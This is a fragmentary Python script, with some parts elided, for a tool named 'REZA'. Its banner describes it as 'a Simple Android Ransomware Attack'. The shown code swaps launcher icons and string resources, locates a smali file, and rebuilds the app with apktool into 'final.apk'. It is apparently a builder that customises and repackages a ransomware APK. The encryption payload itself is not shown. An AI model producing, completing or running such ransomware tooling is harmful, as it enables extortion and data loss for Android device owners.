...
def banner():
    ...
    print(w+d+"      ((("+w+b+"@@@@@@@@@@@@@@@@"+w+d+")))    "+w+b+"REZA - version 1.0")
...
def start():
    ...
    print(f"""
    {r}REZA{w} is a Simple Android Ransomware Attack
    ...
    imgpath = [
        "reza/res/drawable-mdpi-v4/ic_launcher.png",
        "reza/res/drawable-xhdpi-v4/ic_launcher.png",
        "reza/res/drawable-hdpi-v4/ic_launcher.png",
        "reza/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "reza/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L reza/ -name '*0000.smali'","r").readline().strip()
    ...
    os.system("apktool b reza -o final.apk;rm -rf reza")
